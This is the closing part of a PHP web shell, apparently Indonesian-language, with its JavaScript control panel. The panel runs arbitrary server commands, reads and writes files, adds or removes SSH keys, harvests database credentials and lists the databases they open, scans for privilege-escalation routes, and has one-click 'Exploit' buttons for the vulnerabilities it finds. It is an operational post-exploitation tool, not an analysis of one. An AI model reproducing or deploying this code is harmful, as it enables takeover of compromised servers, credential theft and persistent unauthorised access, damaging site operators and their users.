    const cmd = document.getElementById('cmd').value.trim(); if(!cmd) return;
    document.getElementById('cmd').value = '';
    const t = document.getElementById('term');
    const line = document.createElement('div'); line.className = 'term-line';
    line.innerHTML = `<span class="term-in">$</span><span class="term-out">${esc(cmd)}</span>`;
    t.appendChild(line); t.scrollTop = t.scrollHeight;
    const resp = await api('exec', {cmd});
    const outLine = document.createElement('div'); outLine.className = 'term-line';
    if(resp.err) outLine.innerHTML = `<span class="err">[${esc(resp.tier||'ERR')}] Error: ${esc(resp.err)}</span>`;
    else outLine.innerHTML = `<span class="dim">[${esc(resp.tier)}]</span><span class="term-out">${esc(resp.out||'(no output)')}</span>`;
    t.appendChild(outLine); t.scrollTop = t.scrollHeight;
}
async function readFile() {
    const p = document.getElementById('f-path').value.trim(); const o = document.getElementById('f-out');
    if(!p) return o.innerText = 'Path?'; o.innerText = 'Reading...';
    const resp = await api('read', {path:p});
    o.innerText = resp.err ? 'Error: '+resp.err : (resp.content || '(empty)');
}
async function writeFile() {
    const p = document.getElementById('f-path').value.trim(); if(!p) return alert('Path?');
    const data = prompt('Isi konten:'); if(data === null) return;
    const o = document.getElementById('f-out'); o.innerText = 'Writing...';
    const resp = await api('write', {path:p, data:data});
    o.innerText = resp.ok ? 'Success.' : 'Error.';
}

// SSH
async function sshScan() {
    const res = document.getElementById('ssh-res'); res.innerHTML = 'Scanning...';
    const d = await api('ssh_scan');
    if (d.err) return res.innerHTML = '<span class="err">'+d.err+'</span>';
    let h = `<table><tr><th>File</th><th>Perm</th><th>Keys</th></tr>`;
    d.files.forEach(f => h += `<tr><td>${esc(f.path)}</td><td>${esc(f.perm)}</td><td>${f.count}</td></tr>`);
    h += `</table>`;
    if (d.keys.length) {
        h += `<table><tr><th>Type</th><th>Comment</th></tr>`;
        d.keys.forEach(k => h += `<tr><td>${esc(k.type)}</td><td>${esc(k.comment)}</td></tr>`);
        h += `</table>`;
    }
    res.innerHTML = h;
}
async function sshAct(action) {
    const k = document.getElementById('ssh-key').value.trim();
    if (!k) return alert('Isi key dulu!');
    if (!confirm('Yakin ingin '+action+' SSH key ini?')) return;
    const d = await api('ssh_action', {action: action, key: k});
    document.getElementById('ssh-log').innerText = d.msg || d.err;
    sshScan();
}

// DB Harvest
async function dbHarvest() {
    const res = document.getElementById('db-res'); res.innerText = 'Harvesting (mungkin butuh waktu)...';
    const d = await api('db_harvest');
    if (d.err) return res.innerText = 'Error: ' + d.err;
    let out = '';
    d.logs.forEach(l => out += l + '\n');
    if (d.connections.length) {
        out += '\n=== DATABASES FOUND ===\n';
        d.connections.forEach(c => {
            out += `\n[${c.cred.user}@${c.cred.host}]\n` + c.dbs.join('\n') + '\n';
        });
    }
    res.innerText = out || 'No credentials found.';
}

// Scanner & Privesc
async function startScan() {
    let offset = 0; let mal = [];
    const resDiv = document.getElementById('scan-results'); resDiv.innerHTML = '';
    const statDiv = document.getElementById('scan-status'); statDiv.innerText = 'Scanning...';
    while (true) {
        statDiv.innerText = `Analyzing offset ${offset}...`;
        const d = await api('scan', {offset: offset});
        if (d.err) { statDiv.innerText = 'Error: ' + d.err; break; }
        d.files.forEach(f => mal.push(f));
        if (d.done) { statDiv.innerText = `Done! ${mal.length} flagged.`; renderScan(mal); break; }
        offset += 50;
    }
}
function renderScan(mal) {
    if (!mal.length) { document.getElementById('scan-results').innerHTML = '<p class="dim">Clean.</p>'; return; }
    let h = `<table><tr><th>Type</th><th>File</th><th>Analysis</th></tr>`;
    mal.forEach(x => h += `<tr><td><span class="badge">${esc(x.type)}</span></td><td>${esc(x.path)}</td><td>${esc(x.desc)}</td></tr>`);
    h += `</table>`; document.getElementById('scan-results').innerHTML = h;
}
async function privescScan() {
    const res = document.getElementById('privesc-res'); res.innerHTML = 'Scanning...';
    const d = await api('privesc');
    if (d.err) return res.innerHTML = '<span class="err">'+d.err+'</span>';
    let h = `<pre>Kernel: ${esc(d.kernel)}\n`;
    if (d.cve && d.cve.length) h += `CVE: \n  - ${d.cve.join('\n  - ')}\n`;
    if (d.sudo && d.sudo.length) h += `Sudo: \n  ${esc(d.sudo.join('\n  '))}\n`;
    h += `SUID: \n  ${d.suid.map(esc).join('\n  ')}\n`;
    h += `</pre>`;
    res.innerHTML = h;
}
async function startVulnScan() {
    const resDiv = document.getElementById('vuln-results'); resDiv.innerHTML = 'Scanning...';
    const d = await api('vuln_scan');
    if (d.err) { resDiv.innerHTML = '<span class="err">Error: '+d.err+'</span>'; return; }
    if (!d.length) { resDiv.innerHTML = '<p class="dim">Clean.</p>'; return; }
    let h = `<table><tr><th>Type</th><th>Path</th><th>Aksi</th></tr>`;
    d.forEach(v => {
        h += `<tr><td><span class="badge">${esc(v.type)}</span></td><td>${esc(v.path)}</td>
              <td><button onclick="exploit('${esc(v.type)}', '${encodeURIComponent(v.path)}')" style="border-color:#f00;color:#f00;">Exploit</button></td></tr>`;
    });
    h += `</table>`; resDiv.innerHTML = h;
}
async function exploit(t, encP) {
    if(!confirm('Jalankan exploit?')) return;
    const p = decodeURIComponent(encP);
    const d = await api('exploit', {type: t, path: p});
    alert(d.msg || d.err);
}
</script>
</body>
</html>
    <?php
}
if (!defined('GH_ENTRY_DONE')) { define('GH_ENTRY_DONE', true); gh_router(); }
